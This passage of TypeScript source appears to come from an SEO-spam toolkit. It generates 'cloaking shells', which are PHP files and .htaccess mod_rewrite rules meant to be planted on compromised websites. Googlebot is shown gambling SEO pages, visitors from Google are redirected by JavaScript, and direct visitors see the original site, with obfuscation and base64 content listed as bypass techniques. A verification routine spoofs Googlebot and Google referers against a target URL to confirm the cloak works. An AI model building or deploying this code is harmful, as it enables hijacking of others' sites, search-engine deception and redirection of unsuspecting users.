    content: shellContent,
    contentType: "application/x-php",
    description: `Advanced cloaking shell — Googlebot sees full SEO gambling page, users from Google get JS redirect, direct visitors see original site`,
    seoPageHtml,
    internalPages,
    htaccessRules,
    bypassTechniques: [
      "ua_cloaking",
      "b64_content",
      "obfuscation",
      "js_redirect",
      "meta_refresh_fallback",
      "geo_targeting",
      "schema_markup",
      "faq_rich_snippets",
    ],
  };
}

// ═══════════════════════════════════════════════════════
//  GENERATE CLOAKING HTACCESS-ONLY VARIANT
// ═══════════════════════════════════════════════════════

export function generateCloakingHtaccessOnly(config: CloakingConfig): CloakingShell {
  const seoPageHtml = generateSeoPageHtml(config);
  const internalPages = generateInternalPages(config);
  const htaccessRules = generateCloakingHtaccess(config);

  return {
    id: `cloaking_htaccess_${randomStr(8)}`,
    type: "cloaking_htaccess",
    filename: ".htaccess",
    content: htaccessRules,
    contentType: "text/plain",
    description: "Cloaking via .htaccess mod_rewrite — routes bots and search referrals to SEO shell",
    seoPageHtml,
    internalPages,
    htaccessRules,
    bypassTechniques: ["mod_rewrite", "ua_routing", "referer_routing"],
  };
}

// ═══════════════════════════════════════════════════════
//  GENERATE HYBRID (PHP + HTACCESS)
// ═══════════════════════════════════════════════════════

export async function generateCloakingHybrid(
  config: CloakingConfig,
  onProgress: ProgressCallback = () => {},
): Promise<CloakingShell> {
  const pkg = await generateCloakingPackage(config, onProgress);

  return {
    ...pkg,
    id: `cloaking_hybrid_${randomStr(8)}`,
    type: "cloaking_hybrid",
    description: "Hybrid cloaking: .htaccess routes bots to PHP shell, PHP serves full SEO page with UA detection + JS redirect",
  };
}

// ═══════════════════════════════════════════════════════
//  VERIFY CLOAKING
// ═══════════════════════════════════════════════════════

export interface CloakingVerification {
  botResponse: { status: number; title: string; hasKeywords: boolean; hasSchema: boolean };
  userResponse: { status: number; redirected: boolean; redirectUrl: string };
  directResponse: { status: number; isOriginalSite: boolean };
}

export async function verifyCloaking(
  targetUrl: string,
  keywords: string[],
): Promise<CloakingVerification> {
  const results: CloakingVerification = {
    botResponse: { status: 0, title: "", hasKeywords: false, hasSchema: false },
    userResponse: { status: 0, redirected: false, redirectUrl: "" },
    directResponse: { status: 0, isOriginalSite: false },
  };

  try {
    // Test 1: Googlebot UA
    const botRes = await cloakFetch(targetUrl, {
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" },
      redirect: "manual",
    });
    const botHtml = await botRes.text();
    results.botResponse.status = botRes.status;
    const titleMatch = botHtml.match(/<title[^>]*>(.*?)<\/title>/i);
    results.botResponse.title = titleMatch?.[1] || "";
    results.botResponse.hasKeywords = keywords.some(k => botHtml.includes(k));
    results.botResponse.hasSchema = botHtml.includes("application/ld+json");
  } catch { /* ignore */ }

  try {
    // Test 2: User from Google
    const userRes = await cloakFetch(targetUrl, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "https://www.google.com/search?q=test",
      },
      redirect: "manual",
    });
    results.userResponse.status = userRes.status;
    const location = userRes.headers.get("location");
    if (location) {
      results.userResponse.redirected = true;
      results.userResponse.redirectUrl = location;
    } else {
      const html = await userRes.text();
      results.userResponse.redirected = html.includes("window.location") || html.includes("http-equiv=\"refresh\"");
      const urlMatch = html.match(/window\.location\.replace\("([^"]+)"\)/);
      results.userResponse.redirectUrl = urlMatch?.[1] || "";
    }
  } catch { /* ignore */ }

  try {
    // Test 3: Direct visitor
    const directRes = await cloakFetch(targetUrl, {
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
      redirect: "manual",
    });
    results.directResponse.status = directRes.status;
    const directHtml = await directRes.text();
    results.directResponse.isOriginalSite = !keywords.some(k => directHtml.includes(k));
  } catch { /* ignore */ }

  return results;
}
